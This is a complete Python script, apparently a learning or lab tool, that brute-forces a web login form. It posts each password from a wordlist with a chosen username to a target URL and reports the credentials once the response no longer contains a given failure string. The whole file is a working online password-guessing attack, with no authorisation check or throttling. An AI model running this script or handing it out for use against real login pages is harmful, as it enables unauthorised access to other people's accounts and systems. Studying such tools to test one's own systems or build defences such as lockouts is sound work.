import requests
import sys

def read_passwords(file_path):
    """Read passwords from a file."""
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"Error: Password file '{file_path}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"Error reading password file: {str(e)}")
        sys.exit(1)

def brute_force(url, username, passwords, failure_string):
    """Perform brute force attack on the given URL."""
    for password in passwords:
        print(f"Trying: {password}")
        data = {'username': username, 'password': password, 'Login': 'submit'}
        try:
            response = requests.post(url, data=data)
            if failure_string not in response.text:
                print(f"Found username ==> {username}")
                print(f"Found password ==> {password}")
                return
        except requests.RequestException as e:
            print(f"Error during request: {str(e)}")
            sys.exit(1)
    print("No match found.")

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Usage: python bruteforce_part1.py <URL> <username> <password_file> <failure_string>")
        sys.exit(1)

    url = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3]
    failure_string = sys.argv[4]

    # Validate the URL
    if not url.startswith("http://") and not url.startswith("https://"):
        print("Error: Invalid URL. Please provide a valid URL starting with http:// or https://.")
        sys.exit(1)

    passwords = read_passwords(password_file)
    brute_force(url, username, passwords, failure_string)
